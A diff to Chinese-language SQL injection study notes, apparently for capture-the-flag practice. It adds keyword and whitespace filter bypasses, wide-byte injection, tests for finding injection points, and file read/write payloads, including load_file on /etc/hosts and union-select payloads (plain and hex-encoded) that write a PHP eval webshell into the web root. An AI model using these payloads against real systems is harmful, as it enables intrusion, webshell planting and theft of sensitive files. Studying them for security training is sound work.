@@ -1,9 +1,8 @@
 ## 5. SQL注入
 #sql #SQL注入
-
+#information_schema
 联合注入 => 报错注入 => bool盲注 => 时间盲注 => 二次注入
 ### 5.0 判断注入类型
-
 - 整形（没有单双引号）
 - 字符串（有单双引号）
 
@@ -209,16 +208,56 @@ sleep(if(condition,x,y)); -- 为真返回x，为假返回y
 - 软件防火墙
 - 程序防火墙
 
-### 5.11 技巧
+### 5.11 绕过
+#### 5.11.1 过滤关键字
 #字符过滤
-空格被过滤的替代方案
-/**/  
-()  
-回车(url编码中的%0a)  
-\`(tab键上面的按钮)  
-tab 
-两个空格
-
+有些网站直接将关键字替换为空
+- 穿插关键字
+select => selselctect
+or => oorr
+union => uniunionon
+- 大小写转换
+select => SelECt
+or => oR
+union => uNIoN
+- 十六进制替换
+select => selec\\x74
+or => o\\x72
+union => unio\\x6e
+- 双重url编码
+from => %25%36%36%25%36%66%25%37%32%25%36%64
+or => %25%37%35%25%36%39%25%36%65%25%36%66%25%36%65
+union =>
+#### 5.11.2 过滤空格
+1. 注释符绕过
+- \#
+- \-\-
+- /**/  
+- //
+- ;%00
+- ()  
+2. url编码绕过
+- %20 => %2520
+- %0a
+3. 空白字符绕过（举例十六进制）
+- tab 
+- 两个空格
+- SQLite3 => 0A,0D,0C,09,20
+- MySQL5 => 09,0A,0B,0C,0D,A0,20
+- PosgressSQL => 0A,0D,0C,09,20
+- Oracle llg => 00,0A,0D,0C,09,20
+- MSSQL => 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
+5. 特殊符号（反引号、加号、减号、叹号等）
+select\`ueser\`,\`password\`from
+5. 科学计数法
+select user,password from users where user_id\===0e1==union select1,2
+#### 5.11.3 过滤单引号
+魔术引号即php.ini中的magic_quote_gpc
+php版本小于5.4时（5.3废除，5.4移除），如果遇到GB2312、GBK等宽字节编码，可以在注入点增加%df禅师进行宽字节注入（%df%27）
+php发送请求到mysql时字符集使用character_set_client设置值进行了一次编码，从而绕过了对单引号的过滤
+==极少见==
+#### 5.11.4 绕过相等过滤
+mysql中存在utf8_unicode_ci和utf8_general_ci两种编码格式。utf8_general_ci**不仅不区分大小写**，而且**Ä=A，Ö=O，Ü=U，β=s**。对于utf8_unicode_ci**β=ss**。
 ### 5.12 二次注入
 第一次入库的时候进行了一些过滤和转义，一般不会是单纯的二次注入，通常还会与报错注入或bool盲注结合出题，一般会贴出源码并告知有二次注入
 
@@ -242,4 +281,16 @@ bp中的repeter模块或者sqlmap设置参数level=2，会自动检测其中是�
 #### 5.14.2 判断注入点是否存在
 1. 插入单引号
 2. 数值型判断
+通过`and 1=1`（数值型）或者'and `'1'='1`（字符串型）
 3. 通过数字的加减进行判断
+例如`?id=3`，尝试`?id=3-1`和`?id=2`是否相同判断该注入点是否为数值型
+### 5.15 SQL读写文件
+在拥有file权限之后可以通过load_file和into outfile/dumpfile进行读写
+`?id=-1+union+select+load_file('/etc/hosts')`
+若需绕过单引号则可将load_file函数中的参数替换为十六进制
+如果给出了flag的位置则读该文件，若无则读敏感文件MySQL配置文件、apache配置文件、.bash_history等
+可以考虑用sql写文件包括但不限于webshell、计划任务
+`?id=-1+union+select+'<?php eval($_POST['shell']);?>'+into+outfile '/var/www/html/shell.php'`
+`?id=-1+union+select+unhex(0x3c3f706870206576616c28245f504f53545b277368656c6c275d293b3f3e)+into+dumpfile '/var/www/html/shell.php'`
+==尝试写入一个已存在的文件会报错==
+权限足够高还可以写入UDF库进一步扩大攻击面
